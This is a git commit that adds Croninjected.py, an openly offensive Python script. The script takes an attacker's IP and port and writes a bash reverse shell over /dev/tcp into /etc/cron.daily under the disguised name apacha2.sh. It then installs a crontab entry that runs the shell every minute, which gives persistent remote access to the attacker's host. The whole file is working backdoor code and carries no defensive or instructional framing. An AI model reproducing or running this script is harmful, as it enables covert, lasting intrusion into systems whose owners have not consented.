e6af697440e12a14e1b209fdb5fe48282d05d89b
Und3r-r00t <47345110+Und3r-r00t@users.noreply.github.com>
2019-04-14 06:51:55 -0700

    Create Croninjected.py

---
+++ Croninjected.py
@@ -0,0 +1,21 @@
+import os
+
+print('''
+\033[1;31m
+==============injected Payload in crontab==============
+Use your real ip or use dnsexit & noip to get static ip
+================ Coded By : Und3r-r00t ================\033[1;m
+    ''')
+
+
+ip = raw_input('Enter Your IP: ')
+port = raw_input("Enter Your Port: ")
+
+payload = '#!/bin/bash\nbash -i >& /dev/tcp/{}/{} 0>&1'.format(ip, port)
+
+payloadGent = os.popen("echo '{}' > /etc/cron.daily/apacha2.sh".format(payload))
+
+commamde = os.popen('crontab -l | { cat; echo "* * * * * /bin/bash /etc/cron.daily/apacha2.sh"; } | crontab -')
+
+
+print('\033[1;31m=============== Payload is injected  ==============\033[1;m')
